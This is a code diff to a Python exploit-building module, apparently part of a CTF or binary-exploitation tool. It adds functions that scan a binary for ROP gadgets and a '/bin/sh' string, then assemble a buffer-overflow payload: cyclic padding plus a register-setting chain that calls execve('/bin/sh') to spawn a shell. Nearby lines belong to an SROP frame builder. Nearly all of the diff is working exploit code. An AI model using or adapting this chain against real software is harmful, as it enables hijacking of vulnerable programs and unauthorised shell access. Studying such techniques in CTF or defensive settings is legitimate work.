@@ -446,6 +446,38 @@ def sigreturn_frame(*, rip, rsp=0, rdi=0, rsi=0, rdx=0, rax=0, rbp=0, rbx=0, rcx
     return b"".join(struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF) for v in words)
 
 
+def execve_feasible(data: bytes):
+    """What a direct execve("/bin/sh",0,0) syscall ROP needs, and what this binary supplies. Unlike
+    SROP it sets the argument registers with plain pop gadgets, so it wants pop rdi/rsi/rdx, a way
+    to put 59 in rax (pop rax), a `syscall` gadget and a "/bin/sh" string. The natural chain for a
+    binary that imports no `system` but has these gadgets + the string (common in static/CTF
+    binaries)."""
+    return {
+        "syscall": find_syscall(data),
+        "pop_rdi": find_gadget(data, "pop_rdi"),
+        "pop_rsi": find_gadget(data, "pop_rsi"),
+        "pop_rdx": find_gadget(data, "pop_rdx"),
+        "pop_rax": find_pop_rax(data),
+        "binsh": find_string(data, b"/bin/sh"),
+    }
+
+
+def build_execve_syscall(offset: int, *, binsh: int, syscall: int, pop_rdi: int, pop_rsi: int,
+                         pop_rdx: int, pop_rax: int, length: int = 0, ret_gadget=None) -> bytes:
+    """cyclic filler, then rdi=&"/bin/sh" ; rsi=0 ; rdx=0 ; rax=59 ; syscall -> execve("/bin/sh",0,0).
+    A no-PIE binary uses fixed addresses; a PIE caller relocates each argument by the leaked base."""
+    body = bytearray(_cyclic(offset))
+    chain = []
+    if ret_gadget:
+        chain.append(ret_gadget)
+    chain += [pop_rdi, binsh, pop_rsi, 0, pop_rdx, 0, pop_rax, 59, syscall]
+    for word in chain:
+        body += struct.pack("<Q", word & 0xFFFFFFFFFFFFFFFF)
+    if len(body) < length:
+        body += b"C" * (length - len(body))
+    return bytes(body)
+
+
 def srop_feasible(data: bytes):
     """What an SROP execve chain needs, and which pieces this binary supplies. Returns a dict the
     exploit stage uses to decide: {syscall, pop_rax, writable, binsh}. `syscall` is required; a
